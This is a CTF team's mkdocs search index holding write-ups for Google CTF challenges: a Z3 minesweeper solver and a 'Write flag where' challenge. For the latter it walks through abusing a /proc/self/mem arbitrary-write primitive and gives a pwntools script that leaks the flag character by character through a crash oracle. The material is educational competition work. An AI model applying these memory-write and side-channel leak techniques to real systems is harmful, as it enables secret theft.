{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"C4ptur3Th3Fr0g","text":"<p>\ud83d\udea7 Website in construction</p> <p>Write ups and other useful information collected from past experiences participating in Capture The Flag (CTF) competitions as part of the C4ptur3Th3Fr0g team.</p> <p>The main idea of this project is that we can use it as a reference for ourselves in future CTFs. We can use it as well to share write-ups written by us. The previous attempt at doing this is hosted at https://ctf.o-for.net/.</p>"},{"location":"#contributing","title":"Contributing","text":"<p>The source code of this website is hosted in Github (see the link above). To contribute to this project, you can open a pull request against the source code hosted in Github, or contact any collaborator to give you write access to the repository.</p> <p>The website is built using mkdocs material.</p> <ul> <li>Install mkdocs: <code>pip install mkdocs-material</code></li> <li>Clone the repository: <code>git clone git@github.com:c4ptur3th3fr0g/c4ptur3th3fr0g.github.io.git</code></li> <li>Develop locally: <code>mkdocs serve</code></li> <li>Deploy changes: <code>mkdocs gh-deploy</code></li> </ul>"},{"location":"#to-do","title":"To Do","text":"<ul> <li>Define the structure of this project.</li> <li>Build the website after every commit to <code>main</code>.</li> <li>Add links to installers, tutorials, and write-ups that show how to set up and use the tools.</li> </ul>"},{"location":"tools/","title":"Tools","text":""},{"location":"tools/#decompiler","title":"Decompiler","text":"<ul> <li>Ghidra</li> <li>IDA Pro</li> <li>Radare2</li> <li>Binary Ninja</li> </ul> <p>So far all our experience is with Ghidra.</p>"},{"location":"tools/#debugger","title":"Debugger","text":"<ul> <li>GDB</li> <li>Pwngdb</li> </ul>"},{"location":"tools/#misc","title":"Misc","text":"<ul> <li>pwntools</li> <li>Find md5 collisions:<ul> <li>https://github.com/cr-marcstevens/hashclash</li> <li>Example problem: https://github.com/google/google-ctf/tree/main/2024/quals/misc-pycalc</li> </ul> </li> <li>Z3 (Sat solver)</li> </ul>"},{"location":"write-ups/Google%20CTF%202024/mine-the-gap/","title":"Mine the gap","text":"<p>You are given a script <code>minesweeper.py</code>, and a text file, <code>gameboard.txt</code>. Invoking the python script requires <code>pygame</code> to be installed.</p> <pre><code>pip install pygame\n</code></pre> <p>It takes several seconds to load. After loading, we get a minesweeper game</p> <p></p> <p>Inspect the script and search for CTF / FLAG etc.</p> <p>We see this part of the code:</p> <pre><code>    if len(violations) == 0:\n        bits = []\n        for x in range(GRID_WIDTH):\n            bit = 1 if validate_grid[23][x].state in [10, 11] else 0\n            bits.append(bit)\n        flag = hashlib.sha256(bytes(bits)).hexdigest()\n        print(f'Flag: CTF{{{flag}}}')\n\n    else:\n        print(violations)\n</code></pre> <p>We need to solve it, and then we can reconstruct the flag from the solution.</p> <p>Inspect <code>gameboard.txt</code> -- it looks like the board is in a simple text format.</p> <p>The board looks pretty structured. Putting one mine will collapse many other cells, but not all.</p> <pre><code>\u276f wc gameboard.txt\n    1631  198991 5876831 gameboard.txt\n</code></pre> <p>The board is 1600 x 3600 cells. It is huge. It is not possible to solve it by hand.</p> <p>We need to solve the board with code.</p> <p>Idea 1 use backtracking and pray to be fast enough.</p> <p>Idea 2 skip backtracking and use SAT solver (Z3). This is what we did.</p> <p>With Z3, we can create variables and constraints on the values they can get, then ask for a solution. If there is a solution, Z3 will give us the values for the variables. Z3 will find an answer in a reasonable\u2122\ufe0f time.</p> <p>Check the code to generate the solution. With the answer, we can easily recover the flag using the game's code.</p> <pre><code>import z3\n\nwith open('gameboard.txt') as f:\n    data = f.read().split('\\n')\n\n\nrows = len(data)\ncols = len(data[0])\nprint(rows, cols, flush=True)\n\nsolver = z3.Solver()\n\nvars = {}\n\ndef get_var(i, j):\n    assert data[i][j] == '9'\n    if (i, j) not in vars:\n        vars[i, j] = z3.Int(f'var_{i}_{j}')\n        solver.add(0 &lt;= vars[i, j])\n        solver.add(vars[i, j] &lt;= 1)\n    return vars[i, j]\n\n\nfor i in range(rows):\n    for j in range(cols):\n        if data[i][j] in '12345678':\n            flags_on = 0\n            pending = []\n\n            for dx in [-1, 0, 1]:\n                for dy in [-1, 0, 1]:\n                    if dx == 0 and dy == 0:\n                        continue\n\n                    nx = i + dx\n                    ny = j + dy\n\n                    if 0 &lt;= nx &lt; rows and 0 &lt;= ny &lt; cols:\n                        if data[nx][ny] == 'B':\n                            flags_on += 1\n                        elif data[nx][ny] == '9':\n                            pending.append(get_var(nx, ny))\n\n            if not pending:\n                continue\n\n            solver.add(z3.Sum(pending) + flags_on == int(data[i][j]))\n\nprint(len(vars))\n\nfor i in range(rows):\n    for j in range(cols):\n        if data[i][j] == '9':\n            assert (i, j) in vars\n\nprint(\"Solving...\")\nprint(solver.check())\n\nfor (i, j), v in vars.items():\n    if solver.model()[v] == 1:\n        print(i, j)\n</code></pre>"},{"location":"write-ups/Google%20CTF%202024/write-flag-where/","title":"Write flag where","text":"<p>This challenges had three parts with increasing difficulty. During competition we solved up to part 2. The solution to part 2 uses a very nice trick that was not the intended solution.</p>"},{"location":"write-ups/Google%20CTF%202024/write-flag-where/#part-1","title":"Part 1","text":"<p>In this problem you are given a binary <code>chal</code> with a library <code>libc.so.6</code>.</p> <pre><code>\u276f file chal\nchal: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=325b22ba12d76ae327d8eb123e929cece1743e1e, for GNU/Linux 3.2.0, not stripped\n\n\u276f file libc.so.6\nlibc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=69389d485a9793dbe873f0ea2c93e02efaa9aa3d, for GNU/Linux 3.2.0, stripped\n</code></pre> <p>Ok, this is an ELF binary, dynamically linked, we can run it on Linux.</p> <p>We are also given a server we can connect to:</p> <pre><code>nc wfw1.2023.ctfcompetition.com 1337\n\nThis challenge is not a classical pwn\nIn order to solve it will take skills of your own\nAn excellent primitive you get for free\nChoose an address and I will write what I see\nBut the author is cursed or perhaps it's just out of spite\nFor the flag that you seek is the thing you will write\nASLR isn't the challenge so I'll tell you what\nI'll give you my mappings so that you'll have a shot.\n5626cbcd7000-5626cbcd8000 r--p 00000000 00:11e 810424                    /home/user/chal\n5626cbcd8000-5626cbcd9000 r-xp 00001000 00:11e 810424                    /home/user/chal\n5626cbcd9000-5626cbcda000 r--p 00002000 00:11e 810424                    /home/user/chal\n5626cbcda000-5626cbcdb000 r--p 00002000 00:11e 810424                    /home/user/chal\n5626cbcdb000-5626cbcdc000 rw-p 00003000 00:11e 810424                    /home/user/chal\n5626cbcdc000-5626cbcdd000 rw-p 00000000 00:00 0\n7f4d9e838000-7f4d9e83b000 rw-p 00000000 00:00 0\n7f4d9e83b000-7f4d9e863000 r--p 00000000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6\n7f4d9e863000-7f4d9e9f8000 r-xp 00028000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6\n7f4d9e9f8000-7f4d9ea50000 r--p 001bd000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6\n7f4d9ea50000-7f4d9ea54000 r--p 00214000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6\n7f4d9ea54000-7f4d9ea56000 rw-p 00218000 00:11e 811203                    /usr/lib/x86_64-linux-gnu/libc.so.6\n7f4d9ea56000-7f4d9ea63000 rw-p 00000000 00:00 0\n7f4d9ea65000-7f4d9ea67000 rw-p 00000000 00:00 0\n7f4d9ea67000-7f4d9ea69000 r--p 00000000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7f4d9ea69000-7f4d9ea93000 r-xp 00002000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7f4d9ea93000-7f4d9ea9e000 r--p 0002c000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7f4d9ea9f000-7f4d9eaa1000 r--p 00037000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7f4d9eaa1000-7f4d9eaa3000 rw-p 00039000 00:11e 811185                    /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2\n7ffe76706000-7ffe76727000 rw-p 00000000 00:00 0                          [stack]\n7ffe767e9000-7ffe767ed000 r--p 00000000 00:00 0                          [vvar]\n7ffe767ed000-7ffe767ef000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]\n\n\nGive me an address and a length just so:\n&lt;address&gt; &lt;length&gt;\nAnd I'll write it wherever you want it to go.\nIf an exit is all that you desire\nSend me nothing and I will happily expire\n</code></pre> <p>Nice poem, it probably describes the functionality. In hindsight is obvious that it exactly describes its functionality (let's get there in a moment).</p> <p>We tried interacting with the server. After few attempts we figured out that passing something like they said (<code>&lt;address&gt; &lt;length&gt;</code>) where <code>address</code> is a hexadecimal string starting with <code>0x</code> would work (i.e the server wouldn't immediately close).</p> <p>Let's see inside the binary with Ghidra:</p> <p></p> <p>It takes some time to parse the code, and we see some weird artifacts like <code>undefined8</code> but other than that is pretty readable C code (like as much as you can expect from a decompiler and C code combination).</p> <p>In particular we see they are loading the flag from <code>flags.txt</code>, that is something that exist on the server, and its content is what we are looking for.</p> <p>The flag is read to <code>flag</code> variable in this code.</p> <p>The last part of the code seems interesting:</p> <pre><code>sVar2 = read(local_14,&amp;local_78,0x40);\nlocal_1c = (undefined4)sVar2;\niVar1 = __isoc99_sscanf(&amp;local_78,\"0x%llx %u\",&amp;local_28,&amp;local_2c);\nif ((iVar1 != 2) || (0x7f &lt; local_2c)) break;\nlocal_20 = open(\"/proc/self/mem\",2);\nlseek64(local_20,local_28,0);\nwrite(local_20,flag,(ulong)local_2c);\nclose(local_20);\n</code></pre> <p>Tip: In Ghidra you can rename variables or functions to make the code more readable. I haven't found a way to collapse blocks of code, that would be nice.</p> <p>Line by line what is happening:</p> <ul> <li>Read 0x40 (4 * 16 = 64) bytes from <code>local_14</code> file descriptor (i.e potentially stdin) to <code>local_78</code> buffer.</li> <li>...</li> <li>Parse this string as 0x%llx %u (i.e. 0x followed by hexadecimal number followed by a space and a decimal number). Store those numbers in <code>local_28</code> and <code>local_2c</code>.</li> <li>break if the amount of parsed elements is different from 2, or local2c is greater than 0x7f (127).</li> <li>Open <code>/proc/self/mem</code> (i.e. the memory of the current process) in write mode. O_O this seems dangerous.</li> <li>Seek to <code>local_28</code> (i.e. the address we passed to the server).</li> <li>Write the flag to the address we passed, with length <code>local_2c</code>.</li> <li>Close the file descriptor.</li> </ul> <p>Ok, this is great. We can write the flag to any address we want.</p> <p>We need to write it to some place where it will be printed.</p> <p>There is a loop, and the loop starts printing some instructions: <code>Give me an address and a length just so:...</code></p> <p>Let's try to write the flag there. How?</p> <p>Double clicking the text in Ghidra will show exactly where it is in the binary:</p> <p></p> <p>Now this address is relative to the binary, but we need to find where it is in memory. We do know that this text is stored in the <code>.rodata</code> section, and this section is mapped to an specific address in memory.</p> <p></p> <p>Fortunately we are given another hint:</p> <pre><code>ASLR isn't the challenge so I'll tell you what\nI'll give you my mappings so that you'll have a shot.\n</code></pre> <p>And they actually provide the mappings of the running binary in real time: This is the code that does that:</p> <pre><code>    local_c = open(\"/proc/self/maps\",0);\n    read(local_c,maps,0x1000);\n    close(local_c);\n    // ...\n    dprintf(local_14,\"%s\\n\\n\",maps);\n</code></pre> <p>The first five sections are the ones about the binary itself:</p> <pre><code>5626cbcd7000-5626cbcd8000 r--p 00000000 00:11e 810424                    /home/user/chal\n5626cbcd8000-5626cbcd9000 r-xp 00001000 00:11e 810424                    /home/user/chal\n5626cbcd9000-5626cbcda000 r--p 00002000 00:11e 810424                    /home/user/chal\n5626cbcda000-5626cbcdb000 r--p 00002000 00:11e 810424                    /home/user/chal\n5626cbcdb000-5626cbcdc000 rw-p 00003000 00:11e 810424                    /home/user/chal\n</code></pre> <p>The second column will show the mode of the section <code>w</code> means you can write, <code>x</code> means you can execute.</p> <p>With some trial and error we found that the third section was the one with <code>.rodata</code></p> <p>With basic arithmetic we computed where was the address with respect to the beginning of <code>.rodata</code>, and given we know the actual beginning of <code>.rodata</code> from the printed mappings, we knew where was the string address in memory. We wrote the flag there, and we got the flag in the next iteration of the loop.</p>"},{"location":"write-ups/Google%20CTF%202024/write-flag-where/#part-2","title":"Part 2","text":"<p>Second challenge looks pretty much the same, but right now there is no string in the loop. We can't use the solution to the previous part.</p> <p>There are still few strings where we can write the flag to.</p> <p>We can overwrite the code itself, yikes.</p> <p>We got some time analyzing this problem and we found out something new &amp; problematic:</p> <pre><code>local_14 = dup2(1,0x39);\nlocal_18 = open(\"/dev/null\",2);\ndup2(local_18,0);\ndup2(local_18,1);\ndup2(local_18,2);\nclose(local_18);\nalarm(0x3c);\n</code></pre> <p><code>dup2</code> copies a file descriptor into another. <code>0</code> is stdin, <code>1</code> is stdout, <code>2</code> is stderr.</p> <p>Line by line:</p> <ul> <li>Copy stdout to file descriptor 0x39 (57).</li> <li>Open <code>/dev/null</code> in write mode.</li> <li>Copy <code>/dev/null</code> to stdin.</li> <li>Copy <code>/dev/null</code> to stdout.</li> <li>Copy <code>/dev/null</code> to stderr.</li> <li>...</li> <li>Set an alarm to 0x3c (60) seconds.</li> </ul> <p>So all usual way to talk about file descriptors are removed, and if we want to print to stdout we must print to 0x39.</p> <p>In this challenge we can write a prefix of the flag into any location, in particular it can be a prefix of size 1.</p> <p>We can write a prefix of the flag onto itself but shifted to the left, this way in the next iteration rather than writing the flag to some address, we will be writing the beginning of the string that starts at the flag address which is potentially a suffix of the flag.</p> <p>That means we can write any substring / character of the flag anywhere.</p> <p>... time passed</p> <p>One promising but unsuccessful idea was trying to jump to a different place in the code by writing some character of the flag. It turned out the expected solution was along this line, but we never made it work.</p> <p>We tried making the application crash / close / or even trying to exploit the alarm. I.e we needed to leak information from any mean possible.</p> <p>In this part, we didn't get any feedback from the server, i.e nothing was printed, the only feedback was either processing our input and do nothing, or closing if the input was invalid.</p> <p>Wait, that is some information... if the input was invalid it would close and we would get that information. How to use that to leak the flag.</p> <p>We need to make the input fail/succeed depending on parts of the flag.</p> <p>We had access to the pattern of <code>sscanf</code> that we can modify, and that is exactly what we did.</p> <p>We can overwrite the character <code>0</code> from the <code>sscanf</code> pattern with one character from the flag. Then we send a new input, with some character, and if the application doesn't exit, we guessed correctly that character.</p> <p>This way we can guess character one by one, on each step by iterating over all possible characters of the flag. The final script was actually quite slow, but did the job (partially). This is the script:</p> <pre><code>import string\nfrom pwn import *\nimport time\n\nflag_length = 40\n\ndef is_nth_char(index, ch, heap_delta=0xa0):\n\n    context.log_level = 'error'\n\n    conn = remote('wfw2.2023.ctfcompetition.com', 1337)\n    lines = conn.recvlines(timeout=1)\n\n    # parse addresses\n    print(len(lines))\n\n    _rodata = lines[5]\n    _heap = lines[8]\n\n    _rodata_address = int(_rodata.decode().split('-')[0], 16)\n    _heap_address = int(_heap.decode().split('-')[0], 16)\n\n    # print('.rodata : ', hex(_rodata_address))\n    # print('.heap : ', hex(_heap_address))\n\n    flag_address = _heap_address + heap_delta\n\n    format_str_offset = 188\n    format_str_address = _rodata_address + format_str_offset\n\n    # flag = flag[index:]\n\n    # TODO uncomment\n    conn.send(f'{hex(flag_address - index)} {flag_length}\\n'.encode())\n\n    # '0x%llx' -&gt; {flag[index]}'x%llx'\n    conn.send(f'{hex(format_str_address)} 1\\n'.encode())\n\n    # # check conn is alive\n    # try:\n    #     conn.recv()\n    # except EOFError:\n    #     assert False\n\n    for i in range(5):\n        try:\n            conn.send(f'{ch}x123 1\\n'.encode()) # test only is sscanf fails or not\n            sleep(0.2)\n        except EOFError:\n            return False\n\n    return True\n\npartial_flag = list('CTF{') + ['*'] * flag_length\n\nfor i in range(4, flag_length):\n\n    if partial_flag[i] != '*':\n        assert is_nth_char(i, partial_flag[i])\n        continue\n\n    for ch in string.ascii_lowercase + string.ascii_uppercase + string.digits + '_':\n        if is_nth_char(i, ch):\n            print(\"Success:\", i, ch)\n            partial_flag[i] = ch\n            break\n        else:\n            print(\"Failure:\", i, ch)\n\n        print(\"Flag: \", ''.join(partial_flag))\n\n    print(\"Flag: \", ''.join(partial_flag))\n</code></pre> <p>The hardest / more fragile part of the script was trying to detect if the connection was over or not.</p> <p>This predicted all the flag but the last character, since it was not in the set of candidates we were trying. That was guessed manually.</p>"}]}